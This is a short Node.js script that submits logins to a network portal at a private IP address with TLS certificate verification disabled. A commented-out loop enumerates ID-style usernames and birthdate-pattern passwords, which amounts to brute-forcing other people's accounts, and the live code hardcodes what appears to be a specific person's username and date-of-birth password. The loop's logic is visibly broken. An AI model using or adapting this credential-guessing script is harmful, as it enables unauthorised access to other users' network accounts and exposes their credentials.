const request = require('request');
const parseString = require('xml2js').parseString;

function postRequest(usr, pwd) {
    request.post({
        url: "https://172.16.1.1:8090/login.xml",
        rejectUnauthorized: false,
        form: {
            mode: '191',
            password: pwd,
            username: usr,

        }
    },
        function (err, res, body) {

            if (err) { console.log(err); }
            else if (body) {
                console.log(parseString(body, function (err, result) {
                    console.log(result.requestresponse.message);
                }))


            }

        }
    )
}





// function main() {
//     var i;
//     var usr = "imh";
//     for (i = 1; i <= 89; i++) {
//         if (i = 1 && i <= 9) { usr = usr + `100${i}`; }
//         else if (i > 9) { usr = usr + `10${i}`; }

//         usr = usr + "18";

//         for (j = 1; j <= 31; j++) {
//             var pwd = `${i}`;

//             for (k = 1; k <= 12; k++) {
//                 if (k <= 9) { pwd = pwd + `0${i}`; }
//                 else { pwd = pwd + `${i}`; }

//                 pwd = pwd + "1999";

//                 postRequest(usr,pwd,val)
//             }

//         }
//     }

// }

pwd = "230499";
usr = "imh1005218"

postRequest(usr, pwd);